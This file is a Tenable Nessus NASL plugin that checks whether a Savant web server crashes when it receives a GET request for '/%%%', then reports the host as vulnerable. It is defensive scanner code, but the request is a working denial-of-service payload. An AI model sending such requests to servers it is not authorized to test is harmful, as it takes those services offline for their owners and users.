#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10633);
 script_version ("$Revision: 1.20 $");
 script_bugtraq_id(2468);
 script_osvdb_id(55324);
 
 script_name(english:"Savant Web Server Multiple Percent Request Remote DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to cause the Savant web server on the remote host 
to lock by sending a specially crafted GET request for a URL
composed of percent characters." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to a version newer than 3.0." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2001/03/13");
 script_cvs_date("$Date: 2011/03/14 21:48:12 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
 script_summary(english:"Crashes the remote web server");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2001-2011 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_require_ports("Services/www", 80);
 script_dependencies("find_service1.nasl", "no404.nasl", "http_version.nasl");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
banner = get_http_banner(port:port);
if (! banner) exit(1, "No HTTP banner on port "+port);
if ("Savant/" >!< banner) exit(0, "The web server on port "+port+" is not Savant");

if (http_is_dead(port:port)) exit(1, "The web server on port "+port+" is dead");
  
w = http_send_recv3(method:"GET", item:"/%%%", port:port);
if (http_is_dead(port:port, retry: 3))
  security_warning(port);
